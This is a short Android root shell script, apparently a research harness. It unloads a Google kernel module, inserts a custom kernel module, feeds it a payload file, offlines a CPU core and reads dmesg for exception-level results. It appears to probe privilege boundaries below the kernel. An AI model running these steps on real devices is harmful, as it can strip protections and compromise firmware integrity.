rmmod google_ehld_coreinstr 2>/dev/null
rmmod cubs_stage 2>/dev/null; rm -f /dev/cubs_stage /dev/cubs_go /dev/cubs_ram
insmod /data/local/tmp/cubs_stage.ko; sleep 1
cat /data/local/tmp/ho.payload > /dev/cubs_stage
printf "P$CP" > /dev/cubs_go
taskset 1 sh -c "echo S > /dev/cubs_go"
printf "F922002900:0:100" > /dev/cubs_go
printf "L0:2000000" > /dev/cubs_go
echo C > /dev/cubs_go
echo 0 > /sys/devices/system/cpu/cpu${CPUN:-6}/online 2>/dev/null; sleep 1
printf "N${MP:-600}:1" > /dev/cubs_go
sleep 5
printf "A${MP:-600}" > /dev/cubs_go
echo V > /dev/cubs_go
a=$(dmesg | grep -a "cubs_stage: affinity" | tail -1 | sed 's/.*= //')
v=$(dmesg | grep -a "cubs_stage: amp EL" | tail -1 | sed 's/.*reason/reason/')
echo "RESULT CP=$CP aff=$a $v"
[ "$a" = "1" ] && echo 1 > /sys/devices/system/cpu/cpu${CPUN:-6}/online 2>/dev/null
